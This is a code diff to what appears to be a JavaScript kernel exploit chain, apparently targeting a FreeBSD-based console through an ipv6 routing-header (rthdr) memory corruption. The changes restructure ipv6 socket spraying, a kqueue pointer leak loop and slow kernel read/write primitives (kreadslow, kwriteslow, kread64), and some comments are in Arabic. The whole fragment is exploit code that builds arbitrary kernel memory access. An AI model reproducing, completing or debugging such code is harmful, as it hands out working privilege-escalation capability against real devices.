@@ -959,21 +959,17 @@ function setup() {
   iov_sock_1 = read32(iov_sock.add(4));
 
   // Create ipv6 sockets
-  var s = socket(AF_INET6, SOCK_STREAM, 0);
-  if (!s || s.eq(BigInt_Error)) {
-    log('[SETUP] Failed to create ipv6 socket at index ' + _i8);
-    ipv6_socks[_i8] = new BigInt(0); // قيمة آمنة
-  } else {
-    ipv6_socks[_i8] = s;
-  }
   for (var i = 0; i < ipv6_socks.length; i++) {
-    var sd = ipv6_socks[i];
-    if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
-      continue; // skip safely
+    var s = socket(AF_INET6, SOCK_STREAM, 0);
+    if (!s || s.eq(BigInt_Error)) {
+      log('[SETUP] Failed to create ipv6 socket at index ' + i);
+      ipv6_socks[i] = new BigInt(0); // قيمة آمنة
+    } else {
+      ipv6_socks[i] = s;
     }
-    free_rthdr(sd);
   }
-  // Initialize pktopts
+
+  // Initialize pktopts (يمسح أي rthdr قديم بأمان)
   free_rthdrs(ipv6_socks);
 
   // Create pipes
@@ -1350,12 +1346,15 @@ function leak_kqueue() {
       watchdog_tick('leak_kqueue_loop');
     }
     kq = kqueue();
-    var sd0 = ipv6_socks[triplets[0]];
+
+    // إعادة التحقق من sd0 بدون إعادة تعريفه
+    sd0 = ipv6_socks[triplets[0]];
     if (!sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
       log('[LEAK] triplets[0] socket became invalid during loop');
       return false;
     }
-    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
+
+    get_rthdr(sd0, leak_rthdr, 0x100);
     var cur_magic = read64(magic_add);
     var cur_fdp = read64(leak_rthdr.add(0x98));
     log('[LEAK] iter=' + count + ' magic=' + hex(cur_magic) + ' fdp=' + hex(cur_fdp));
@@ -1557,16 +1556,6 @@ function kreadslow(addr, size) {
 
   return leak_buffer;
 }
-
-function kreadslow64(address) {
-  var buffer = kreadslow(address, 8);
-  if (buffer.eq(BigInt_Error)) {
-    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
-    return BigInt_Error; // لا cleanup ولا throw – الفلو فوق هو اللي يقرّر
-  }
-  return read64(buffer);
-}
-
 function kwriteslow(addr, buffer, size) {
   log('[KW] Enter kwriteslow addr=' + hex(addr));
 
@@ -1699,7 +1688,14 @@ function kwriteslow(addr, buffer, size) {
 /* ===========================
   *   kread / kwrite wrappers
   * =========================== */
-
+function kreadslow64(address) {
+  var buffer = kreadslow(address, 8);
+  if (buffer.eq(BigInt_Error)) {
+    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
+    return BigInt_Error; // لا cleanup ولا throw – الفلو فوق هو اللي يقرّر
+  }
+  return read64(buffer);
+}
 function kread64(addr) {
   return kreadslow64(addr);
 }
